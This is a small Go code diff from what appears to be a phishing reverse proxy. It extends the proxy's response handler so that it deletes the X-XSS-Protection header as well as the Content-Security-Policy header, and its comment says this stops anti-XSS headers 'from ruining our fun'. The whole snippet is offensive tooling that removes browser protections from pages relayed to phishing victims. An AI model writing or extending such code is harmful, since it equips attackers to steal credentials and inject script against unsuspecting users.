@@ -70,8 +70,9 @@ func (p *phishingProxy) ModifyResponse(response *http.Response) error {
 		}
 	}
 
-	// Stop CSPs from ruining the fun
+	// Stop CSPs and anti-XSS headers from ruining our fun
 	response.Header.Del("Content-Security-Policy")
+	response.Header.Del("X-XSS-Protection")
 	return nil
 }
 
